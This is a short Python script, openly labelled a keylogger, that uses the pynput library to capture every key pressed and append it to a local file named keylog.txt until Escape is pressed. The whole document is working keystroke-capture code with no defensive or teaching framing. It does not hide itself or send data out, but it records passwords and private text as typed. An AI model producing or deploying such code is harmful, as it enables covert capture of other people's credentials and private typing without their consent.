from pynput.keyboard import Key, Listener

# Define the path to the log file
LOG_FILE = "keylog.txt"

def on_press(key):
    # Open the log file in append mode
    with open(LOG_FILE, "a") as f:
        try:
            # Write the pressed key to the log file
            f.write(str(key.char))
        except AttributeError:
            # If a special key (e.g., shift, ctrl, etc.) is pressed, write its name
            f.write(str(key))

def on_release(key):
    # Stop the keylogger if the Escape key is pressed
    if key == Key.esc:
        return False

def main():
    print("Keylogger started. Press 'Esc' to stop.")
    
    # Start listening for key events
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
